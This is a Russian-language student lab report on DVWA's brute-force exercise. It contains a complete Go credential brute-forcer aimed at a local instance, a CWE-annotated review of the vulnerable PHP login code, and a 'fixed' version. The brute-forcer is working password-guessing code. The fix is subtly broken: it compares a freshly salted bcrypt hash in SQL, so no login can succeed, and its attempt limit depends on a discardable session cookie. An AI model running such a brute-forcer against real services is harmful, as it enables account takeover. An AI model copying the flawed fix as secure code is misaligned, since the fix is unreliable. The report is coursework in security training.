# Практическая работа 3

Фадеев Всеволод Вадимович, БСБО-02-21

## 1. Необходимо разработать переборщик паролей для формы в задании Bruteforce в dvwa

Сначала осуществляется логин в dvwa, получается PHP сессия и необходимые куки, после чего осуществляется последовательный брутфорс всех известных паролей для всех пользователей системы

```go
package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
)

var (
	baseURL = &url.URL{
		Scheme: "http",
		Host:   "127.0.0.1:4280",
	}
	bruteforceURL      = "http://127.0.0.1:4280/vulnerabilities/brute/"
	loginURL           = "http://127.0.0.1:4280/login.php"
	userTokenRegexpStr = `<input\s+type=['"]hidden['"]\s+name=['"]user_token['"]\s+value=['"]([^'"]+)['"]\s*/?>`
)

func openFile(name string) *bufio.Scanner {
	file, err := os.Open(name)
	if err != nil {
		panic(fmt.Sprintf("Ошибка открытия файла: %v", err))
	}

	return bufio.NewScanner(file)
}

func setup(client *http.Client) {
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	securityCookie := &http.Cookie{Name: "security", Value: "low"}
	client.Jar.SetCookies(baseURL, []*http.Cookie{securityCookie})

	loginPageRequest, err := http.NewRequest("GET", loginURL, nil)
	if err != nil {
		panic(err)
	}

	loginPageRequest.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	loginPageResponse, err := client.Do(loginPageRequest)
	if err != nil {
		panic(err)
	}

	defer loginPageResponse.Body.Close()

	loginPageHTML, err := io.ReadAll(loginPageResponse.Body)
	if err != nil {
		panic(err)
	}

	userTokenRegexp := regexp.MustCompile(userTokenRegexpStr)
	match := userTokenRegexp.FindStringSubmatch(string(loginPageHTML))

	if len(match) < 1 {
		panic("UserToken не найден")
	}

	userToken := match[1]

	data := url.Values{}
	data.Set("username", "admin")
	data.Set("password", "password")
	data.Set("Login", "Login")
	data.Set("user_token", userToken)

	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		panic(err)
	}

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
}

func main() {
	jar, err := cookiejar.New(nil)

	if err != nil {
		fmt.Println("Ошибка инициализации cookiejar: ", err)
		return
	}

	client := &http.Client{
		Jar: jar,
	}
	setup(client)
	usernamesScanner := openFile("usernames.txt")

	for usernamesScanner.Scan() {
		username := usernamesScanner.Text()
		passwordsScanner := openFile("passwords.txt")

		for passwordsScanner.Scan() {
			password := passwordsScanner.Text()
			success, err := tryLogin(client, username, password)

			if err != nil {
				fmt.Println("Ошибка при попытке авторизации для пользователя", username, ":", err)
				continue
			}

			if success {
				fmt.Printf("Пароль для пользователя %s найден: %s\n", username, password)
				return
			}
		}

		if err := passwordsScanner.Err(); err != nil {
			panic(err)
		}
	}

	if err := usernamesScanner.Err(); err != nil {
		panic(err)
	}
}

func tryLogin(client *http.Client, username, password string) (bool, error) {
	params := url.Values{}
	params.Set("username", username)
	params.Set("password", password)
	params.Set("Login", "Login")

	fullURL := fmt.Sprintf("%s?%s#", bruteforceURL, params.Encode())
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return false, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	if strings.Contains(string(body), "Welcome") {
		return true, nil
	}

	return false, nil
}
```
## Проанализировать код и сделать кодревью, указав слабые места. Слабость уязвимого кода необходимо указать с использованием метрики CWE (база данных cwe.mitre.org)

### Анализ эндпоинта авторизации на основе CWE-правил

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	$user = $_GET[ 'username' ];

	$pass = $_GET[ 'password' ];

	/* (1) Небезопасное хэширование пароля (CWE-327) Использование функции md5() устаревшая практика, так как MD5 считается небезопасным и подвержен атакам по подбору */
	$pass = md5( $pass );

	/* (2) SQL-инъекция (CWE-89) - $user и $pass включены в SQL-запрос без предварительной фильтрации или экранирования */
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";

	/* (3) Потенциальный риск раскрытия ошибок (CWE-209) */
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		/* (4) Уязвимость к межсайтовому скриптингу (XSS) (CWE-79) - Переменная $user вставляется в HTML-код без какой-либо очистки или экранирования */
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}


/* (5) Код не ограничивает количество попыток входа, что позволяет злоумышленнику применять метод перебора (brute-force) для подбора пароля. Это существенно упрощает атаку на учетные записи пользователей. */

?>
```

### Исправленный эндпоинт авторизации на основе замеченных проблем

Если попробовать провести bruteforce, с данной реализацией login.php в DVWA, bruteforce будет провален из-за созданных проверок на безопасность

```php
<?php
session_start();

$attempts_limit = 5;
$attempts_time_window = 60;

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = [];
}

$_SESSION['login_attempts'] = array_filter($_SESSION['login_attempts'], function($timestamp) use ($attempts_time_window) {
    return $timestamp > (time() - $attempts_time_window);
});

if (count($_SESSION['login_attempts']) >= $attempts_limit) {
    die('<pre>Too many login attempts. Please try again later.</pre>');
}

if (isset($_GET['Login'])) {
    $_SESSION['login_attempts'][] = time();

    $mysqli = $GLOBALS["___mysqli_ston"];
    
    $user = mysqli_real_escape_string($mysqli, $_GET['username']);
    
    $pass = $_GET['password'];
    $hashed_pass = password_hash($pass, PASSWORD_BCRYPT);

    $query = "SELECT * FROM `users` WHERE user = ? AND password = ?";
    $stmt = mysqli_prepare($mysqli, $query);
    mysqli_stmt_bind_param($stmt, "ss", $user, $hashed_pass);

    if (mysqli_stmt_execute($stmt)) {
        $result = mysqli_stmt_get_result($stmt);
        
        if ($result && mysqli_num_rows($result) == 1) {
            $row = mysqli_fetch_assoc($result);
            $avatar = htmlspecialchars($row["avatar"]);
            
            $html = "<p>Welcome to the password protected area " . htmlspecialchars($user) . "</p>";
            $html .= "<img src=\"{$avatar}\" />";
            
            $_SESSION['login_attempts'] = [];
        } else {
            $html = "<pre><br />Username and/or password incorrect.</pre>";
        }
    } else {
        error_log(mysqli_error($mysqli));
        $html = "<pre>Database error.</pre>";
    }
    
    mysqli_stmt_close($stmt);
    mysqli_close($mysqli);
}
?>
```